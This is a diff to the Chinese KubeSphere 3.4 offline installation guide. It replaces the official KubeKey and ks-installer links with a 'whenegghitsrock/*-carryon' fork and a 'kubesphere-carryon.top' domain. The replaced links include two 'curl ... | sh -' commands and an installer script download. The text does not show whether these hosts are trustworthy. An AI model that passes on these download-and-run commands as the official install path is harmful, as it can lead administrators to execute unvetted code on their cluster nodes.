@@ -51,7 +51,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 
 {{< notice note >}}
 
-[KubeKey](https://github.com/kubesphere/kubekey) 使用 `/var/lib/docker` 作为默认路径来存储所有 Docker 相关文件（包括镜像）。建议您添加附加存储卷，分别给 `/var/lib/docker` 和 `/mnt/registry` 挂载至少 **100G**。请参见 [fdisk](https://www.computerhope.com/unix/fdisk.htm) 的参考命令。
+[KubeKey](https://github.com/whenegghitsrock/kubekey-carryon) 使用 `/var/lib/docker` 作为默认路径来存储所有 Docker 相关文件（包括镜像）。建议您添加附加存储卷，分别给 `/var/lib/docker` 和 `/mnt/registry` 挂载至少 **100G**。请参见 [fdisk](https://www.computerhope.com/unix/fdisk.htm) 的参考命令。
 
 {{</ notice >}}
 
@@ -64,10 +64,10 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 
    {{< tab "如果您能正常访问 GitHub/Googleapis" >}}
 
-   从 [GitHub Release Page](https://github.com/kubesphere/kubekey/releases) 下载 KubeKey 或者直接运行以下命令。
+   从 [GitHub Release Page](https://github.com/whenegghitsrock/kubekey-carryon/releases) 下载 KubeKey 或者直接运行以下命令。
 
    ```bash
-   curl -sfL https://get-kk.kubesphere.io | VERSION=v3.0.13 sh -
+   curl -sfL https://get-kk.docs.kubesphere-carryon.top | VERSION=v3.0.13 sh -
    ```
 
    {{</ tab >}}
@@ -83,7 +83,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
    运行以下命令来下载 KubeKey：
 
    ```bash
-   curl -sfL https://get-kk.kubesphere.io | VERSION=v3.0.13 sh -
+   curl -sfL https://get-kk.docs.kubesphere-carryon.top | VERSION=v3.0.13 sh -
    ```
    {{</ tab >}}
 
@@ -102,7 +102,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 1. 使用以下命令从能够访问互联网的机器上下载镜像清单文件 `images-list.txt`：
 
    ```bash
-   curl -L -O https://github.com/kubesphere/ks-installer/releases/download/v3.4.1/images-list.txt
+   curl -L -O https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.4.1/images-list.txt
    ```
 
    {{< notice note >}}
@@ -114,7 +114,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 2. 下载 `offline-installation-tool.sh`。
 
    ```bash
-   curl -L -O https://github.com/kubesphere/ks-installer/releases/download/v3.4.1/offline-installation-tool.sh
+   curl -L -O https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.4.1/offline-installation-tool.sh
    ```
 
 3. 使 `.sh` 文件可执行。
@@ -228,7 +228,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 
 #### 编辑配置文件
 
-编辑该配置文件 `config-sample.yaml`。请查看[供您参考的示例](https://github.com/kubesphere/kubekey/blob/release-2.2/docs/config-example.md)。
+编辑该配置文件 `config-sample.yaml`。请查看[供您参考的示例](https://github.com/whenegghitsrock/kubekey-carryon/blob/release-2.2/docs/config-example.md)。
 
    {{< notice warning >}} 
 
@@ -310,7 +310,7 @@ KubeSphere 3.4 对内置角色和自定义角色的授权项做了一些调整�
 
 #### 编辑配置文件
 
-编辑该配置文件 `config-sample.yaml`。请查看[供您参考的示例](https://github.com/kubesphere/kubekey/blob/release-2.2/docs/config-example.md)。
+编辑该配置文件 `config-sample.yaml`。请查看[供您参考的示例](https://github.com/whenegghitsrock/kubekey-carryon/blob/release-2.2/docs/config-example.md)。
 
    {{< notice warning >}} 
 
